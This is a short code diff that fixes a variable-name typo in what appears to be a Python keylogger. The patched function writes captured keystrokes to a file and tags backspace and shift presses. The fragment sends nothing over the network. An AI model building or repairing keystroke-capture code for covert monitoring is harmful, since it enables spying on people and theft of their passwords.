@@ -21,7 +21,7 @@ def write_to_file(keys):
     with open(path, 'a') as file:
         for key in keyboard_Input:
             write_down = str(key).replace("'", "")
-            if wirte_down.find('backspace') > 0:
+            if write_down.find('backspace') > 0:
                 file.write(' *BACKSPACE* ')
             elif write_down.find('shift') > 0:
                 file.write(' *SHIFT* ')
